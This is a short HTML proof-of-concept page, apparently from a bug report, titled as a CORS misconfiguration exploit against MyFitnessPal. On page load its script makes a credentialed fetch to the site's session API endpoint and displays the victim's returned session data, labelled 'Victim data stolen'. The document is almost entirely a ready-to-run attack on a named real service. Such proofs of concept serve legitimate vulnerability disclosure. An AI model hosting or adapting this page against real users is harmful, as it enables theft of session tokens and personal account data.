<!DOCTYPE html>
<html>
<head><title>MFP CORS PoC</title></head>
<body>
<h1>MyFitnessPal CORS Misconfiguration PoC</h1>
<p>Victim data stolen from myfitnesspal.com:</p>
<pre id="output">Fetching...</pre>
<script>
async function steal() {
  try {
    const r = await fetch('https://www.myfitnesspal.com/api/auth/session', {
      credentials: 'include',
      headers: {'Accept': 'application/json'}
    });
    const data = await r.json();
    document.getElementById('output').textContent = JSON.stringify(data, null, 2);
  } catch(e) {
    document.getElementById('output').textContent = 'Error: ' + e;
  }
}
steal();
</script>
</body>
</html>
